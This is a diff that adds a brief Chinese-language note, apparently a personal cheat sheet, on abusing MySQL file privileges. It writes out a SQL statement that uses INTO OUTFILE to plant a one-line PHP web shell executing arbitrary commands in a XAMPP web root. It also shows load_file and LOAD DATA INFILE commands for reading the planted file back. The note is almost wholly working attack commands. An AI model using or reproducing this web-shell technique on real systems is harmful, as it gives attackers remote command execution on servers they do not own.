@@ -1,0 +1,10 @@
+在root权限下:
+写文件
+select "<? system($_REQUEST['cmd']);?>"  INTO OUTFILE "C:/xampp/htdocs/c.php";
+读文件
+select load_file('c:/xampp/htdocs/c.php');
+
+
+LOAD DATA INFILE 语句以非常高的速度从文本文件中读取行到表中。
+LOAD DATA INFILE "c:/xampp/htdocs/c.php" into table sqltest;
+
